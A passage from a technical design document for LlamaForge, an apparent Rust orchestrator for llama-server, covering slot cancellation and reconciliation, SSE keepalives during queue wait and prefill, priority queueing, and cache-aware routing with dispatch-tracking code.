     - **`id_task` observation (not injection):** `id_task` is an internal `llama-server` field — it is NOT a client-settable parameter. LlamaForge does not inject `id_task` into requests. Instead, `id_task` values are **read from `/slots` responses** and used for secondary correlation when `id_slot` auto-assignment leaves the slot unknown at dispatch time. LlamaForge maintains an `id_task_map` (`HashMap<(ServerId, i32), RequestId>`) that is populated lazily: when a `/slots` poll returns a slot in `is_processing` state, and LlamaForge has an in-flight request on that server whose assigned slot matches (or was auto-assigned and not yet discovered), the `id_task` from the response is recorded for future correlation.
     - **`id_task` type and overflow resilience:** `id_task` is declared as `int` (signed 32-bit) in llama-server's source (`server_task::id`, `server_queue::get_new_id()`), not unsigned. The counter space is 2^31 (~2.1 billion). The increment (`id++`) has no wrap-around handling — signed integer overflow is **undefined behavior in C++** (compilers may optimize assuming it never happens; in practice on x86 it wraps to `INT_MIN`). At 100 req/s sustained, overflow occurs in ~248 days; at 1,000 req/s (batched embeddings), ~25 days. LlamaForge's `id_task_map` uses `i32` (not `u32`) to match llama-server's actual type and correctly handle negative values after overflow. To prevent stale entries from causing false correlations after `id_task` wraps, map entries are expired after 60 seconds — any entry older than 60 seconds is evicted on the next `/slots` poll cycle.
     - **Overflow mitigation (long-running deployments):** LlamaForge tracks a per-server `cumulative_requests: u64` counter (incremented on each dispatch). When this counter exceeds `i32::MAX / 2` (1.07 billion — providing 50% safety margin before the llama-server counter overflows), a `server.id_task_overflow_approaching` warning is logged. The operator should schedule a rolling restart of the affected server (which resets llama-server's `id_task` counter to 0). For automated environments, the configurable `auto_restart_on_id_task_overflow` option (default: `false`) triggers a graceful restart when the threshold is reached. **Critical: the reverse pass MUST NOT rely solely on `id_task` correlation.** If the reverse pass encounters a slot with an `id_task` value that has no match in the `id_task_map` AND the server has `cumulative_requests > i32::MAX * 0.9` (indicating likely overflow territory), it extends the grace period to 60 seconds (10× normal) before erasing. This prevents false erasures when overflowed `id_task` values break correlation. This is ultimately a llama-server bug (signed overflow UB) that LlamaForge must be resilient to, not dependent on.
     - **Reconciliation:** On each `/slots` poll, the **forward pass** checks all entries in the `slot_dispatch_map`: if a slot that LlamaForge believes is occupied shows as idle in the `/slots` response, the map entry is removed and the `DispatchToken` is released. The **reverse pass** checks from the backend's perspective: for each active slot reported by llama-server, if LlamaForge has no corresponding entry in the `slot_dispatch_map`, the slot is orphaned and erased after a 10-second grace period (to avoid racing in-flight dispatches). This bidirectional reconciliation is the same safety net described in Section 10.2. A `llamaforge_slot_dispatch_map_size{server_id}` gauge tracks the map size for leak detection.
     - **Fallback:** If slot correlation fails entirely (e.g., older `llama-server` versions, or auto-assigned requests where the response was never received), LlamaForge matches by prompt prefix hash against the `prompt` field in the `/slots` response. The first matching slot in `is_processing: true` state is targeted for erase.
   - Asynchronously issues `POST /slots/{slot_id}?action=erase` to forcibly clear the identified slot.
   - On receiving a 200 OK from the erase request, transitions the slot to `available` and notifies the scheduler.
   - If the erase request times out (2 seconds) or fails, or if no matching slot can be identified, the slot remains in `cooldown` until the next `/slots` poll confirms it is idle.
3. **Cleanup:** The request transitions to `Cancelled` status with `FINISH_REASON_CLIENT_DISCONNECT`. Metrics are recorded with the tokens generated up to the disconnect point. The cancellation record is written to the audit log via the bounded cancellation channel (if the disconnect was detected via `Drop`) or directly via the detached audit task (if detected cooperatively).

**Bounded response channel:** Each streaming response uses a bounded `tokio::sync::mpsc` channel (capacity: 64 chunks) between the proxy task and the client-facing stream. If the client is slow and the channel fills, the proxy task drops the connection after a configurable backpressure timeout (default: 5 seconds), triggering the cancellation sequence above. This prevents a single slow client from holding a GPU slot indefinitely.

> **[AP-6] Backpressure tuning and upstream flow control:** Consider reducing the backpressure timeout to 2 seconds for production deployments — 5 seconds of buffered tokens at 100 tok/s is ~500 tokens (~2KB), and a client that cannot consume for 2 full seconds is almost certainly dead or pathologically slow. Additionally, once the response channel is full, the proxy task SHOULD stop reading from llama-server (by not polling the `reqwest` stream future in the `select!`). This applies TCP backpressure to llama-server's continuous batching engine, which will naturally slow token generation for that slot — allowing other slots to make progress rather than buffering tokens in LlamaForge's memory. When the client resumes consumption and the channel drains below 50% capacity, the proxy task resumes polling the backend stream.

**SSE keepalives during queue wait:** A streaming request can sit in the `MultiLevelQueue` for up to `queue_timeout_secs` (default: 300 seconds) before dispatch. During this window, the client has an open HTTP connection but receives no data — reverse proxies and load balancers will drop the connection long before the request is dispatched.

To prevent this, LlamaForge's HTTP streaming handler returns an active SSE stream **immediately upon admission**, before the request enters the queue. This stream serves as the single connection for the entire request lifecycle — queue wait, prefill, and generation — with no splice or handoff:

1. **Queue phase:** The stream emits `QueueUpdate` SSE events (containing `position` and `estimated_wait_secs`) whenever the request's queue position changes (dispatch of another request, eviction, new arrival). Between position updates, `: ping\n\n` SSE comments are emitted at the configured keepalive interval to prevent proxy timeouts.
2. **Dispatch transition:** When the scheduler dispatches the request, the handler receives the server assignment via an internal `tokio::sync::oneshot` channel. The stream seamlessly transitions to the prefill/generation phase — no connection closure or re-establishment.
3. **Prefill and generation phases:** Keepalives and token streaming continue as described below.

For gRPC streaming, the queue phase emits `QueueUpdate` messages via the `oneof response_type` envelope — these are first-class protobuf messages, not transport-level hacks. gRPC HTTP/2 PING frames provide the transport-level keepalive.

**Client disconnect during queue wait:** If a client drops their connection while the request is waiting in the `MultiLevelQueue` (before dispatch), LlamaForge must remove the request from the queue immediately to avoid wasting a GPU slot on a request that no one is listening for. The queue-wait handler uses `tokio::select!` to race the dispatch notification against the client's liveness signal:

```rust
// Simplified queue-wait handler for streaming requests:
let (dispatch_tx, dispatch_rx) = tokio::sync::oneshot::channel();
queue.insert(request_entry, dispatch_tx);

tokio::select! {
    // Branch 1: Request is dispatched to a server.
    server_assignment = dispatch_rx => {
        // Transition to prefill/generation phase.
        proxy_to_server(server_assignment, sse_stream).await;
    }
    // Branch 2: Client disconnected while waiting.
    _ = client_cancellation_token.cancelled() => {
        // Remove from queue. VecDeque removal is O(D) where D = requests
        // at the same effective_priority — acceptable since queue depths
        // are typically <100 at LlamaForge's target scale.
        queue.remove_by_id(&request_id);
        tracing::info!(request_id = %request_id, "client disconnected during queue wait");
        QUEUE_CANCELLATIONS.inc();
        // Log audit event — no GPU resources were consumed.
        audit_tx.send(AuditEvent::RequestCancelled(RequestMetrics {
            request_id,
            status: Status::Cancelled,
            finish_reason: FinishReason::ClientDisconnect,
            queue_wait_ms: elapsed.as_millis() as f64,
            tokens_generated: 0,
            ..Default::default()
        })).await.ok();
    }
    // Branch 3: Queue timeout expired.
    _ = tokio::time::sleep(queue_timeout) => {
        queue.remove_by_id(&request_id);
        // Return HTTP 408 / gRPC DEADLINE_EXCEEDED.
    }
}
```

For gRPC streaming, the client cancellation is detected via tonic's `CancellationToken` (which fires on HTTP/2 stream reset or `RST_STREAM`). For HTTP/SSE, the SSE response body sender returns `Err(Closed)` when the TCP connection drops, which is caught by the keepalive loop and triggers `client_cancellation_token.cancel()`.

For non-streaming requests (`stream: false`), there is no open SSE stream during the queue wait. The HTTP connection is held open with TCP keepalives only (the OS-level `SO_KEEPALIVE`). If the queue wait exceeds the client's or proxy's read timeout, the client receives an HTTP 408 (Request Timeout) or a proxy-generated 504 (Gateway Timeout). This is acceptable: non-streaming clients are inherently batch-oriented and must handle timeouts. The `queue_timeout_secs` parameter allows clients to bound their wait explicitly.

> **[G-6] Non-streaming queue disconnect detection:** For non-streaming requests, set `SO_KEEPALIVE` with aggressive parameters via `socket2` on the accepted TCP socket: idle = 10s, interval = 5s, probes = 3. This detects dead clients within ~25 seconds rather than the Linux default of ~2 hours. Additionally, before dispatching a non-streaming request from the queue, perform a **zero-byte write probe** on the underlying TCP connection (`poll_write_ready` or equivalent) to detect already-closed sockets. If the probe fails, the request is removed from the queue immediately — preventing a dead client from consuming a GPU slot that would then sit idle until the generation timeout fires.

> **Deployment note (proxy timeouts):** Default TCP `SO_KEEPALIVE` intervals are 2+ hours on Linux (`tcp_keepalive_time = 7200s`), but common reverse proxies drop idle connections far sooner: nginx `proxy_read_timeout` defaults to 60s, AWS ALB idle timeout defaults to 60s, Traefik `respondingTimeouts.readTimeout` is often configured to 60-120s. A non-streaming request with a queue wait of 90 seconds will be dropped by any default-configured proxy, returning a proxy-generated 504 with no indication that the request was queued. To avoid this:
>
> - Set `queue_timeout_secs` for non-streaming requests to a value **below** the proxy's read timeout (e.g., 55 seconds for a 60-second proxy timeout).
> - Alternatively, increase the proxy's read timeout to exceed the expected maximum queue wait: nginx `proxy_read_timeout 310s`, AWS ALB idle timeout ≥ `queue_timeout_secs + 10`, Traefik `respondingTimeouts.readTimeout = 310s`.
> - For workloads with unpredictable queue wait, prefer `stream: true` — SSE keepalives prevent proxy timeouts regardless of queue duration.

```toml
[gateway]
queue_update_interval_secs = 5     # How often to push QueueUpdate to waiting clients (0 = only on position change)
sse_keepalive_interval_secs = 15   # Applies to BOTH queue wait and prefill phases (0 to disable)
```

**SSE keepalives during prefill:** Long-context prompts can take 5-30+ seconds to prefill before `llama-server` emits the first token. During this window, no SSE data is sent to the client. Reverse proxies (nginx default: 60s), load balancers (ALB default: 60s), and HTTP clients (many default: 30s) may interpret this silence as a stalled connection and close it — causing a spurious client disconnect that triggers the full cancellation sequence (slot cooldown, erase command, audit logging overhead).

To prevent this, the same SSE comment keepalive mechanism used during the queue phase (`: ping\n\n` at the configured `sse_keepalive_interval_secs`) continues during the prefill phase. SSE comments (lines beginning with `:`) are defined in the SSE spec as being silently ignored by conformant `EventSource` clients — they do not trigger `onmessage` callbacks and are invisible to the application layer. The 15-second default interval is chosen to be well within common proxy timeout defaults while avoiding unnecessary traffic. Keepalives stop once the first real token chunk is received (at which point token-by-token streaming provides its own implicit keepalive). The keepalive interval is shared with the queue-phase config above (`[gateway] sse_keepalive_interval_secs`).

For gRPC streaming, the equivalent is handled by gRPC's built-in HTTP/2 PING frames (configured via `http2_keepalive_interval` in `tonic::transport::Server`), which operate at the transport layer and require no application-level intervention.

---

## 9. Priority System & Eviction

### 9.1 Priority Computation

```rust
fn compute_effective_priority(
    task_type: &TaskType,
    requestor: &str,
    explicit_override: Option<u32>,
    starvation_boost: u32,
    config: &PriorityConfig,
) -> u32 {
    let base = config.task_type_priority(task_type);
    let requestor_bonus = config.requestor_bonus(requestor);

    let computed = base + requestor_bonus + starvation_boost;

    // Explicit override replaces base + bonus, but starvation still applies
    match explicit_override {
        Some(override_val) => override_val + starvation_boost,
        None => computed,
    }
    .min(1500)  // Hard cap to prevent runaway priority
}
```

### 9.2 Queue-Only Preemption (v1)

In v1, high-priority requests **jump the queue** but do **not** cancel in-flight requests. This is a deliberate simplification: preemptive eviction of in-flight requests creates a large state space (mid-stream cancellation, partial token rollback, client reconnection) that adds significant complexity and bug risk without proportional value in early deployments.

**How it works:**

```
New request R arrives with priority P_new.
All server slots are occupied.

→ R enters the priority queue at its effective_priority position.
→ R waits for the next slot to become available.
→ When a slot frees, the scheduler pops the highest-priority request
  from the queue — which may be R or a previously-queued request
  that R jumped ahead of.
→ Lower-priority requests that were already queued move down in position.
```

There is no cancellation of in-flight work. The "eviction" that exists in v1 is purely positional — high-priority requests push lower-priority requests further back in the queue, not off a GPU slot.

**Client experience:** If a client submits a `background` request and then an `emergency` request arrives, the `emergency` request will be served before the `background` request *if both are still queued*. But if the `background` request has already been dispatched to a slot and is generating tokens, it runs to completion.

**Why this is sufficient for v1:**

- With proper `--parallel` configuration (4-8 slots per server), slot availability turns over quickly. Most requests complete in seconds to tens of seconds.
- Queue-only priority gives 90% of the scheduling value with 10% of the complexity.
- The starvation prevention mechanism (Section 9.1) ensures low-priority requests still get served.
- Operators who need true preemption can configure more parallel slots to reduce contention.

### 9.3 Preemptive Eviction (v2 — Planned)

Full preemptive eviction is planned for v2, restricted to a safe cancellation boundary: **prefill-only eviction**. A request can only be evicted if it is still in the prefill phase (processing prompt tokens) and has not yet generated any completion tokens. This eliminates the hardest problems (partial output on client streams, wasted compute on generated tokens) while enabling preemption for the most impactful case — a long prompt that's blocking a slot during prefill.

v2 eviction will require:

- **Phase detection via LlamaForge's internal first-token signal (not `/slots` polling).** LlamaForge already knows the exact prefill→decode transition for every dispatched request: the first SSE token arriving on the proxy stream (recorded as `first_token_at` in the STREAM phase of Section 8). This provides <1ms phase detection precision. The eviction boundary is:
  - **Evictable:** Request has been dispatched but the proxy stream has NOT received its first token → still in prefill.
  - **Not evictable:** Proxy stream has received its first token → in decode phase, tokens already sent to client.
  - **Fallback:** `/slots` `n_decoded` field is retained as a consistency check for the edge case where the proxy stream is terminated before the first token arrives (e.g., network split between LlamaForge and llama-server). `/slots` is polled every 5 seconds — far too coarse for primary phase detection (a 200ms prefill has a 97% chance of appearing as "already in decode" by the next poll, making eviction nearly useless for short prompts).
- A minimum priority gap (configurable, default: 200) to prevent thrashing.
- An eviction cooldown (2 seconds after dispatch) to prevent re-eviction loops.
- Explicit client notification via `EvictionNotice` on the gRPC stream or SSE event.
- Full audit trail in the event store.

---

## 10. Smart Routing Strategy

LlamaForge doesn't implement batching itself — `llama-server` handles continuous batching internally via its slot architecture. LlamaForge's smart routing is about making intelligent request placement decisions to maximize the efficiency of that built-in batching.

### 10.1 llama-server Control Surfaces

LlamaForge's routing intelligence is built on top of the concrete control surfaces that `llama-server` exposes. Understanding what can and cannot be controlled externally is essential to understanding the system's architectural boundaries.

**What LlamaForge CAN control (per-request):**

| Control Surface | Mechanism | How LlamaForge Uses It |
|-----------------|-----------|----------------------|
| **Slot pinning** | `id_slot` parameter on `/completion`, `/v1/chat/completions` | Route a request to a specific slot for cache reuse. Set to `-1` (default) for auto-assignment, or a specific slot number when prompt prefix affinity indicates a cache-warm slot. See Section 10.3 (Prompt Cache Affinity). |
| **Prompt cache reuse** | `cache_prompt` boolean per-request (default: `true`) | Controls whether `llama-server` reuses KV cache from the previous request on the assigned slot when prompts share a prefix. LlamaForge sets this to `true` by default and exposes it as a per-request option via the gRPC `cache_prompt` field and HTTP request body. Operators can disable it for workloads where prompt diversity is high and cache pollution degrades throughput. |
| **Slot KV cache erase** | `POST /slots/{id_slot}?action=erase` | Wipe a slot's KV cache. Used by the orphan slot recovery path (Section 10.2, reverse reconciliation) and exposed to operators via the management API for manual cache invalidation. Returns `{"n_erased": N}` with the number of tokens cleared. **Idempotent:** erasing an already-idle slot returns `{"n_erased": 0}` with HTTP 200. LlamaForge treats any 2xx response (including zero-token erase) as success. This is important because the cooperative disconnect handler, reverse reconciliation pass, and manual SRE escape hatch may race — double-erase is harmless. |
| **Slot KV cache save** | `POST /slots/{id_slot}?action=save` (requires `--slot-save-path`) | Save a slot's KV cache state to disk. Enables warm-cache strategies: an operator can save the KV cache after processing a long system prompt, then restore it on a different slot or after a server restart. LlamaForge exposes this via the management API (`POST /api/servers/{id}/slots/{slot}/cache/save`). |
| **Slot KV cache restore** | `POST /slots/{id_slot}?action=restore` (requires `--slot-save-path`) | Restore a previously saved KV cache state to a slot. Combined with save, this enables cross-slot and cross-restart cache persistence for frequently-used system prompts. LlamaForge exposes this via `POST /api/servers/{id}/slots/{slot}/cache/restore`. |

**What LlamaForge CANNOT control (internal to llama-server):**

| Boundary | Why It Matters |
|----------|---------------|
| **Batch composition** | Which requests participate in a single forward pass is determined entirely by `llama-server`'s internal scheduler. LlamaForge cannot influence which sequences are batched together — it can only control *which server and slot* a request lands on. This is the fundamental difference from vLLM's iteration-level scheduling (see Section 3.1). |
| **Dynamic batch size** | `-b` (batch size) and `-ub` (micro-batch size) are startup parameters. They cannot be adjusted at runtime without restarting the `llama-server` process. LlamaForge manages this through its process lifecycle: changing batch size requires a server restart via the Config Manager. |
| **Dynamic slot count** | `-np` (parallel slots) is a startup parameter. Adding or removing slots requires a server restart. LlamaForge handles this via the Server Manager's restart-with-new-config flow. |
| **KV cache allocation granularity** | llama.cpp uses a unified contiguous KV cache shared across all sequences. Memory allocation and defragmentation within this buffer are internal. LlamaForge can monitor utilization via `/metrics` (`kv_cache_usage_ratio`) but cannot influence allocation. |
| **FlashAttention toggle** | `--flash-attn` (`auto`/`on`/`off`) is a startup parameter. LlamaForge exposes it as a first-class config option (see `flash_attention` in server config) but changing it requires a server restart. |

**Orchestrator-level strategies enabled by these control surfaces:**

1. **Cache-warm slot pinning:** When the routing algorithm detects a prompt prefix match for a specific slot (via the hierarchical hash in Section 10.3), it sets `id_slot` to pin the request to that slot, maximizing KV cache reuse. This is the primary mechanism for achieving prefix caching benefits without PagedAttention.

2. **System prompt pre-warming:** For high-traffic system prompts (e.g., a shared agent preamble), operators can use the cache save/restore API to: (a) process one request with the system prompt to warm the cache, (b) save the slot's KV cache to disk, (c) restore it to multiple slots across multiple servers. This amortizes the system prompt prefill cost across the fleet.

3. **Cache-aware load balancing:** The routing score formula (Section 10.2) incorporates `prompt_cache_affinity` as a weighted factor. This means requests with shared prefixes are naturally routed to the same server, clustering related workloads for cache efficiency while still respecting slot availability and overall load balance.

4. **Explicit cache invalidation:** When an operator updates a system prompt or LoRA adapter, they can use the management API to erase the relevant slots' KV caches, preventing stale cache hits from producing incorrect completions with outdated context.

### 10.2 Routing Algorithm

```
For each incoming request R with model M:

1. Find all servers S[] that serve model M and are in Running state.
   Apply hard routing constraints (model match, server state, multimodal,
   LoRA adapter, embedding, reranking — see list below) to eliminate
   ineligible servers.

   **If S[] is empty after constraint filtering, reject immediately:**
   - Model M not configured at all → gRPC `NOT_FOUND` / HTTP 404:
     {"error": "model_not_found", "model": "M"}
   - Model M exists but no server passes capability constraints →
     gRPC `INVALID_ARGUMENT` / HTTP 400 with specific constraint:
     {"error": "no_capable_server", "constraint": "lora_adapter",
      "requested": "finetune-v2", "available": ["finetune-v1"]}
   - Model M exists but all servers are in non-Running state (Starting,
     Restarting, Failed) → gRPC `UNAVAILABLE` / HTTP 503:
     {"error": "model_unavailable", "model": "M", "server_states":
      {"gpu0": "Starting", "gpu1": "Failed"}}

   This rejection happens at admission, before the request enters the
   queue. Enqueuing an unroutable request wastes the client's HTTP
   connection for up to queue_timeout_secs (300s default) with zero
   chance of dispatch.

   **Exception — transient unavailability:** If all servers for model M
   are in `Starting` or `Restarting` state (not `Failed`), the request
   MAY be enqueued with a short grace period (30 seconds, configurable
   via `startup_wait_secs`) to allow servers to come online. If no
   server reaches Running within the grace period, the request is
   rejected with the 503 above. This handles the cold-start race where
   a request arrives milliseconds before the server finishes loading.

2. For each server S[i], compute a routing score:
   score = w_slots × free_slot_ratio(S[i])
         + w_kv    × (1.0 - kv_cache_usage(S[i]))
         + w_queue × (1.0 - deferred_ratio(S[i]))
         + w_affinity × prompt_cache_affinity(S[i], R)

   Where:
     free_slot_ratio = max(0, idle_slots_from_last_poll - tracker.count()) / total_slots
     kv_cache_usage  = from /metrics kv_cache_usage_ratio
     deferred_ratio  = requests_deferred / total_slots
     prompt_cache_affinity = hierarchical prefix match score (0.0–0.95, see Section 10.3)
                             // Graduated: 0.30 (64-token match), 0.50 (256), 0.75 (1024), 0.95 (4096+)

   Default weights: w_slots=0.4, w_kv=0.2, w_queue=0.2, w_affinity=0.2
   // Weights should sum to 1.0 for intuitive score interpretation. At startup, LlamaForge
   // warns (but does not reject) if the sum differs from 1.0 — non-unit sums change the
   // relative contribution of each factor proportionally but don't break correctness
   // (the score is used for relative comparison, not as an absolute value).

3. Route to the server with the highest score.
   **Tie-breaker:** When multiple servers have identical scores (common on an idle cluster), use **deterministic round-robin** (a per-model atomic counter mod eligible server count) to spread requests evenly. Without this, concurrent requests arriving between `/slots` polling intervals would all land on the same server, consuming its slots while other servers sit idle.
   If all scores are 0 (all servers fully loaded), enqueue.
```

**Stale-Slot Compensation (Dispatch Tracking Set):**

The `/slots` endpoint is polled every 5 seconds. Between polls, the scheduler has no visibility into slots consumed by recently dispatched requests. Without compensation, a burst of requests within a single polling window will all evaluate the same stale `free_slot_ratio` and dogpile onto one server — completely bypassing LlamaForge's priority queue.

Each server maintains a **dual-structure dispatch tracker**: a `DashSet<RequestId>` for ID-level reconciliation and a sidecar `AtomicU32` for O(1) lock-free routing reads. The set is managed via an RAII guard to prevent leaks:

> **Why two structures?** Three earlier designs were each fatally flawed:
>
> 1. **`AtomicU32` alone** with heuristic "reset to 0 on each `/slots` poll" reconciliation: if the counter is forcefully reset to 0 while N proxy tasks are still in-flight, those tasks later call `fetch_sub(1)` on a zero counter, underflowing to `u32::MAX` (4,294,967,295). The routing formula evaluates to 0 permanently, bricking the server until restart. You cannot underflow a set — hence the `DashSet`.
>
> 2. **`DashSet` alone** for both reconciliation and routing: `DashSet::len()` acquires a read lock on **every shard** sequentially. With `dashmap`'s default shard count (num_cpus × 4, typically 32-64 on a production node), each `.len()` call touches all shards. With 20 concurrent routing decisions evaluating 4 candidate servers each, that is 80 × 64 = 5,120 shard locks per routing cycle — devastating for latency under contention.
>
> 3. **`AtomicU32` alone with RAII increment/decrement** (no reconciliation set): avoids the underflow bug (no heuristic reset), but provides no mechanism to detect stale entries. If a proxy task panics between dispatch and the first `/slots` poll, the counter is permanently inflated by 1 (the `Drop` impl fires, but the corresponding `/slots`-based reconciliation has no set to cross-reference). Over time, leaked counts accumulate and reduce the server's effective routing capacity to zero.
>
> The dual-structure approach combines their strengths: the `DashSet` provides ID-level membership for reconciliation (stale entry detection), while the `AtomicU32` provides O(1) lock-free reads for the routing hot path. The RAII guard maintains both atomically.

> **Scale-aware design note: `Arc<Mutex<HashSet>>` as v1 alternative.**
>
> At LlamaForge's target deployment scale (2-4 GPUs, 5-20 concurrent users), the dual-structure approach is defensible but over-engineered. Concurrent routing evaluations at any given millisecond are effectively 1-2 — acquiring an uncontended `std::sync::Mutex` in Rust takes ~15 nanoseconds, making the DashSet+AtomicU32 contention optimization irrelevant at this scale. A simpler `Arc<Mutex<HashSet<RequestId>>>` provides equivalent correctness with dramatically less complexity:
>
> ```rust
> struct SimpleDispatchTracker {
>     inner: std::sync::Mutex<HashSet<RequestId>>,
> }
>
> impl SimpleDispatchTracker {
>     fn count(&self) -> usize {
>         self.inner.lock().unwrap().len()  // ~15ns uncontended
>     }
>     fn insert(&self, id: RequestId) -> bool {
>         self.inner.lock().unwrap().insert(id)
>     }
>     fn remove(&self, id: &RequestId) -> bool {
>         self.inner.lock().unwrap().remove(id)
>     }
>     fn snapshot_ids(&self) -> Vec<RequestId> {
>         self.inner.lock().unwrap().iter().cloned().collect()
>     }
> }
> ```
>
> This eliminates: (a) the sidecar AtomicU32 and its Acquire/Release ordering concerns, (b) the snapshot-then-remove reconciliation pattern (just lock, iterate, remove under the same lock — the critical section is microseconds at <100 entries), (c) the ahash dependency (HashSet uses SipHash, but at <100 entries the hashing cost is negligible), and (d) the `DashSet` shard contention analysis. The RAII `DispatchToken` pattern remains identical — it just calls `tracker.remove()` instead of separate DashSet + AtomicU32 operations.
>
> **When the dual-structure becomes necessary:** If LlamaForge scales to 16+ GPUs with 100+ concurrent routing evaluations per second, the Mutex's contention cost grows linearly with concurrency. At that point, the DashSet+AtomicU32 split becomes justified. The trait boundary for dispatch tracking (`count()`, `insert()`, `remove()`, `snapshot_ids()`) is identical between the two implementations — switching is a single-line type alias change.
>
> **v1 recommendation:** Ship with `Arc<Mutex<HashSet>>`. The code below documents the dual-structure design for the scaling path, but v1 implementations SHOULD use the simpler Mutex variant unless profiling demonstrates routing contention.

```rust
use ahash::RandomState;

/// Per-server dispatch tracking state. The DashSet provides ID-level
/// membership for /slots reconciliation; the AtomicU32 provides O(1)
/// lock-free reads for the routing hot path.
///
/// The DashSet uses `ahash::RandomState` instead of the default `SipHash`.
/// `RequestId` is a `Uuid` (v7) — 16 bytes of already-collision-resistant
/// data generated by LlamaForge itself (not from untrusted input). SipHash's
/// DoS resistance is unnecessary here and costs ~2-3x more CPU per hash on
/// 16-byte keys compared to ahash. On the dispatch hot path (insert + remove
/// per request, reconciliation every 5s), the cumulative savings are meaningful.
struct DispatchTracker {
    ids: DashSet<RequestId, RandomState>,
    count: AtomicU32,
}

impl DispatchTracker {
    fn new() -> Self {
        Self {
            ids: DashSet::with_hasher(RandomState::new()),
            count: AtomicU32::new(0),
        }
    }

    /// O(1) lock-free read for the routing formula.
    fn count(&self) -> u32 {
        self.count.load(Ordering::Acquire)
    }
}

/// RAII guard that removes the request from the server's dispatch tracking
/// on drop, regardless of how the proxy task terminates (success, error,
/// panic, cancellation). Maintains both the DashSet and the sidecar AtomicU32.
struct DispatchToken {
    tracking: Option<(Arc<DispatchTracker>, RequestId)>,
    server_id: String,
}

impl DispatchToken {
    fn new(
        tracker: Arc<DispatchTracker>,
        request_id: RequestId,
        server_id: String,
    ) -> Self {
        tracker.ids.insert(request_id.clone());
        tracker.count.fetch_add(1, Ordering::Release);
        Self { tracking: Some((tracker, request_id)), server_id }
    }

    /// Explicitly release the slot (e.g., before spawning a detached audit task).
    /// After calling this, the Drop impl is a no-op (tracking is already None).
    fn release(&mut self) {
        if let Some((tracker, id)) = self.tracking.take() {
            // CRITICAL: Only decrement if removal actually succeeded.
            // Forward reconciliation may have already removed this ID and
            // decremented the counter. Without this guard, both paths call
            // fetch_sub(1), underflowing the AtomicU32 to u32::MAX and
            // permanently bricking the server's routing score.
            if tracker.ids.remove(&id).is_some() {
                tracker.count.fetch_sub(1, Ordering::Release);
            }
        }
    }
}

impl Drop for DispatchToken {
    fn drop(&mut self) {
        self.release(); // Safe: .take() returns None if already released
    }
}
```

> **Ordering justification:** `fetch_add` / `fetch_sub` use `Release` ordering; the routing formula's `count.load()` uses `Acquire`. This establishes a happens-before relationship: any routing decision that reads count N is guaranteed to see at least N insertions into the `DashSet`. The `DashSet` itself is only accessed during reconciliation (which runs on a single poller task, not the routing hot path), so shard contention is irrelevant there.

The `DispatchToken` is created when the scheduler dispatches a request to a server, and is moved into the proxy stream future. This guarantees leak-free capacity accounting regardless of how the task terminates — whether by successful completion, `reqwest` connection failure (e.g., connection refused, ephemeral port exhaustion), client disconnect, or Tokio task cancellation. Without RAII, any error path that forgets to remove the tracking entry would permanently reduce the server's routing capacity.

- **Inserted** when the scheduler dispatches a request (via `DispatchToken::new()` — adds to `DashSet` AND increments `AtomicU32`).
- **Removed** when the proxy task completes or fails (via `DispatchToken::release()` or `Drop` — removes from `DashSet` AND decrements `AtomicU32`, but **only if the DashSet removal succeeds** — the `is_some()` guard prevents double-decrement races with reconciliation).
- **Reconciled** on each `/slots` poll via a **snapshot-then-remove** pattern to avoid shard contention with concurrent proxy tasks:
  
  ```rust
  // ── Forward pass: remove DashSet entries whose slot is no longer active ──
  
  // Step 1: Snapshot all tracked IDs into a local Vec.
  // DashSet::iter() acquires read locks on each shard as it visits them.
  // We collect immediately and drop the iterator to minimize lock hold time.
  let tracked_ids: Vec<RequestId> = tracker.ids.iter().map(|r| r.clone()).collect();
  // Iterator is dropped here — all shard locks released.
  
  // Step 2: Build the set of active slots from the /slots response.
  let active_slots: HashSet<u32> = slots_response.iter()
      .filter(|s| s.is_processing)
      .map(|s| s.id)
      .collect();
  
  // Step 3: Remove stale entries one by one (each .remove() locks only one shard).
  let now = Instant::now();
  for request_id in &tracked_ids {
      // Look up the slot this request was dispatched to via the slot_dispatch_map.
      let slot_id = slot_dispatch_map.get_slot_for_request(request_id);
      if let Some(sid) = slot_id {
          if !active_slots.contains(&sid) {
              // CRITICAL: Grace period for dispatch-to-slot transition.
              // There is a window between dispatch (HTTP POST sent to llama-server)
              // and slot state transition (llama-server assigns the request to a slot
              // and reports it as is_processing: true). If this poll fires during that
              // window, the slot appears idle and we'd falsely reap a valid dispatch.
              // Skip entries dispatched within the last 10 seconds.
              if let Some(dispatched_at) = slot_dispatch_map.get_dispatched_at(request_id) {
                  if now.duration_since(dispatched_at) < Duration::from_secs(10) {
                      continue; // too fresh — skip this cycle
                  }
              }
              // CRITICAL: Only decrement the count if removal actually succeeded.
              // DispatchToken::drop() may race with reconciliation on the same ID.
              // Without this guard, both paths call fetch_sub(1), underflowing the
              // AtomicU32 to u32::MAX and permanently bricking the server's routing.
              if tracker.ids.remove(request_id).is_some() {
                  tracker.count.fetch_sub(1, Ordering::Release);
              }
              slot_dispatch_map.remove(request_id);
          }
      }
      // If the request_id has no slot_dispatch_map entry, it was already
      // cleaned up by the cooperative completion path — skip it.
  }
  
  // ── Housekeeping: clean up first_seen_processing for idle slots ──
  //
  // CRITICAL: Remove entries for slots that are no longer processing.
  // Without this, a slot reused for a new request retains the stale timestamp
  // from its previous request (potentially minutes old). The grace period
  // check (now - first_seen > 10s) would immediately pass, and the reverse
  // pass would falsely erase the legitimately-busy slot.
  for slot in slots_response.iter() {
      if !slot.is_processing {
          first_seen_processing.remove(&(server_id.clone(), slot.id));
      }
  }
  
  // [G-10] Also remove entries tracked by the cooperative path — these don't
  // need orphan detection since slot_dispatch_map already tracks them.
  first_seen_processing.retain(|key, _| !slot_dispatch_map.contains_key(key));
  
  // [G-10] Maximum map size guard: prevent unbounded growth from
  // pathological edge cases (e.g., rapid server restarts creating
  // stale (server_id, slot_id) pairs that never get cleaned).
  if first_seen_processing.len() > 1000 {
      let mut entries: Vec<_> = first_seen_processing.iter().map(|(k, v)| (k.clone(), *v)).collect();
      entries.sort_by_key(|(_, ts)| *ts);
      let evict_count = entries.len() / 2;
      for (key, _) in entries.into_iter().take(evict_count) {
          first_seen_processing.remove(&key);
      }
  }
  
  // ── Reverse pass: erase orphaned backend slots unknown to LlamaForge ──
  //
  // This catches the "ghost request" TOCTOU: if DispatchToken::release()
  // removed the request_id from the DashSet *before* the cancellation
  // record was sent (or the cancellation channel was full and try_send()
  // dropped it), the forward pass above will never see the orphaned slot
  // because it only iterates IDs that LlamaForge still tracks.
  //
  // The reverse pass iterates from the *backend's* perspective: for each
  // active slot reported by llama-server, check whether LlamaForge
  // still has a corresponding entry in the slot_dispatch_map. If not,
